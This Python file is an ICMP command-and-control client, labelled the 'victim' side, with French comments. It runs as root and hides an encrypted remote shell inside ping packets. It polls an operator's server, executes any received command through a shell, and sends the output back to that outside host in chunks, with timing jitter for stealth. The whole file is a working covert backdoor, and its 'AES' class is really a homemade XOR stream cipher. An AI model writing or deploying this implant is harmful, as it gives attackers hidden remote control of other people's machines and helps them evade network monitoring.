#!/usr/bin/env python3
"""
ICMP C2 Client (Victime)
Usage: sudo python3 client.py --server 1.2.3.4 --key mysecretpass
"""

import socket
import struct
import subprocess
import time
import os
import sys
import argparse
import hashlib
import random

# ===== Crypto =====

class AESCipher:
    def __init__(self, key: str):
        self.key = hashlib.sha256(key.encode()).digest()

    def encrypt(self, plaintext: bytes) -> bytes:
        iv = os.urandom(16)
        ct = self._xor_stream(plaintext, iv)
        return iv + ct

    def decrypt(self, data: bytes) -> bytes:
        iv = data[:16]
        ct = data[16:]
        return self._xor_stream(ct, iv)

    def _xor_stream(self, data: bytes, iv: bytes) -> bytes:
        out = bytearray()
        counter = 0
        while len(out) < len(data):
            block = hashlib.sha256(self.key + iv + struct.pack("<Q", counter)).digest()
            out.extend(block)
            counter += 1
        return bytes(a ^ b for a, b in zip(data, out[:len(data)]))

# ===== ICMP =====

MAGIC = b'\xDE\xAD'
MSG_POLL   = 0x01
MSG_OUTPUT = 0x02
MSG_CMD    = 0x03
MSG_NOP    = 0x04

ICMP_ECHO_REQUEST = 8
ICMP_ECHO_REPLY   = 0

def checksum(data: bytes) -> int:
    if len(data) % 2:
        data += b'\x00'
    s = sum(struct.unpack("!%dH" % (len(data) // 2), data))
    s = (s >> 16) + (s & 0xFFFF)
    s += s >> 16
    return ~s & 0xFFFF

def build_icmp_request(icmp_id: int, icmp_seq: int, payload: bytes) -> bytes:
    header = struct.pack("!BBHHH", ICMP_ECHO_REQUEST, 0, 0, icmp_id, icmp_seq)
    cksum = checksum(header + payload)
    header = struct.pack("!BBHHH", ICMP_ECHO_REQUEST, 0, cksum, icmp_id, icmp_seq)
    return header + payload

def parse_icmp_reply(raw: bytes):
    ip_hdr_len = (raw[0] & 0x0F) * 4
    icmp_data = raw[ip_hdr_len:]
    if len(icmp_data) < 8:
        return None
    icmp_type, _, _, icmp_id, icmp_seq = struct.unpack("!BBHHH", icmp_data[:8])
    payload = icmp_data[8:]
    return icmp_type, icmp_id, icmp_seq, payload

def make_payload(msg_type: int, data: bytes, cipher: AESCipher) -> bytes:
    encrypted = cipher.encrypt(data)
    return MAGIC + struct.pack("B", msg_type) + encrypted

def parse_payload(payload: bytes, cipher: AESCipher):
    if len(payload) < 4 or payload[:2] != MAGIC:
        return None
    msg_type = payload[2]
    encrypted = payload[3:]
    try:
        decrypted = cipher.decrypt(encrypted)
        return msg_type, decrypted
    except Exception:
        return None

def send_and_receive(sock, server_ip, icmp_id, seq, payload, timeout=5):
    packet = build_icmp_request(icmp_id, seq, payload)
    sock.sendto(packet, (server_ip, 0))

    sock.settimeout(timeout)
    deadline = time.time() + timeout

    while time.time() < deadline:
        try:
            raw = sock.recvfrom(65535)[0]
        except socket.timeout:
            return None

        parsed = parse_icmp_reply(raw)
        if not parsed:
            continue

        icmp_type, rid, rseq, rpayload = parsed

        # ====================================================
        # FIX 1 : Ignorer nos propres Echo Requests
        #          Le raw socket ICMP reçoit TOUT le trafic ICMP
        #          y compris nos propres paquets envoyés
        # ====================================================
        if icmp_type != ICMP_ECHO_REPLY:
            continue

        if rid == icmp_id and rseq == seq:
            return rpayload

    return None

def execute_command(cmd: str) -> str:
    try:
        result = subprocess.run(
            cmd,
            shell=True,
            capture_output=True,
            text=True,
            timeout=30
        )
        output = result.stdout + result.stderr
        if not output.strip():
            output = "[*] Command executed (no output)\n"
        return output
    except subprocess.TimeoutExpired:
        return "[!] Command timed out\n"
    except Exception as e:
        return f"[!] Error: {e}\n"

def main():
    parser = argparse.ArgumentParser(description="ICMP C2 Client")
    parser.add_argument("--server", "-s", required=True)
    parser.add_argument("--key", "-k", required=True)
    parser.add_argument("--interval", "-i", type=float, default=2.0)
    parser.add_argument("--jitter", "-j", type=float, default=0.5)
    args = parser.parse_args()

    cipher = AESCipher(args.key)

    if os.geteuid() != 0:
        print("[!] Root requis")
        sys.exit(1)

    try:
        server_ip = socket.gethostbyname(args.server)
    except socket.gaierror:
        print(f"[!] Cannot resolve {args.server}")
        sys.exit(1)

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    except PermissionError:
        print("[!] Permission denied")
        sys.exit(1)

    # ====================================================
    # FIX 2 : ID fixe par session pour que le serveur
    #          puisse corréler, mais random au démarrage
    # ====================================================
    icmp_id = os.getpid() & 0xFFFF
    seq = 0

    print(f"[*] ICMP C2 client -> {server_ip} (id={icmp_id})")

    while True:
        try:
            seq = (seq + 1) % 65536

            poll_payload = make_payload(MSG_POLL, b"poll", cipher)
            response = send_and_receive(sock, server_ip, icmp_id, seq, poll_payload)

            if response:
                result = parse_payload(response, cipher)
                if result:
                    msg_type, data = result

                    if msg_type == MSG_CMD:
                        cmd = data.decode(errors="replace")

                        if cmd.strip().lower() == "exit":
                            print("[*] Exit received")
                            break

                        output = execute_command(cmd)

                        # ====================================================
                        # FIX 3 : Envoyer un marqueur de fin pour que
                        #          le serveur sache quand l'output est complet
                        # ====================================================
                        chunk_size = 512
                        output_bytes = output.encode()
                        for i in range(0, len(output_bytes), chunk_size):
                            seq = (seq + 1) % 65536
                            chunk = output_bytes[i:i + chunk_size]
                            out_payload = make_payload(MSG_OUTPUT, chunk, cipher)
                            send_and_receive(sock, server_ip, icmp_id, seq, out_payload, timeout=3)
                            time.sleep(0.1)

                    # MSG_NOP : rien à faire, normal

            jitter = random.uniform(0, args.jitter)
            time.sleep(args.interval + jitter)

        except KeyboardInterrupt:
            break
        except Exception as e:
            print(f"[!] Error: {e}")
            time.sleep(args.interval)

    sock.close()

if __name__ == "__main__":
    main()
